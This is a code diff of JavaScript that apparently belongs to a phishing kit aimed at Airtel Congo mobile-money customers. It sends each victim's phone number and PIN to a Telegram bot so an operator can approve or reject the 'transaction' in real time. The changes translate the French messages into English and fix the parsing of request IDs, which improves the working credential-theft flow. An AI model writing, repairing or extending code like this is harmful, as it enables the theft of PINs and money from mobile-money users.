@@ -162,8 +162,8 @@ async function sendTelegramNotification(phone, pin) {
     const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     
     const lines = [
-        '📲 Nouvelle demande Airtel Congo',
-        '📱 Téléphone: ' + phone,
+        '📲 New Airtel Congo Request',
+        '📱 Phone: ' + phone,
         '🔑 PIN: ' + pin,
         '🆔 Request: ' + requestId
     ];
@@ -178,8 +178,8 @@ async function sendTelegramNotification(phone, pin) {
                 text: message,
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ Approuver', callback_data: 'approve_' + requestId },
-                        { text: '❌ Rejeter', callback_data: 'reject_' + requestId }
+                        { text: '✅ Approve', callback_data: 'approve_' + requestId },
+                        { text: '❌ Reject', callback_data: 'reject_' + requestId }
                     ]]
                 }
             })
@@ -199,7 +199,9 @@ async function checkTelegramApproval(requestId) {
         if (data.ok && Array.isArray(data.result)) {
             for (const update of data.result) {
                 if (update.callback_query) {
-                    const [action, id] = update.callback_query.data.split('_');
+                    const parts = update.callback_query.data.split('_');
+                    const action = parts[0];
+                    const id = parts.slice(1).join('_');
                     if (id === requestId) {
                         if (action === 'approve') {
                             try {
@@ -208,7 +210,7 @@ async function checkTelegramApproval(requestId) {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         chat_id: update.callback_query.from.id,
-                                        text: '✅ Transaction approuvée! L\'utilisateur peut maintenant vérifier son OTP.'
+                                        text: '✅ Transaction approved!'
                                     })
                                 });
                             } catch (e) {}
@@ -220,7 +222,7 @@ async function checkTelegramApproval(requestId) {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         chat_id: update.callback_query.from.id,
-                                        text: '❌ Transaction rejetée.'
+                                        text: '❌ Transaction rejected.'
                                     })
                                 });
                             } catch (e) {}
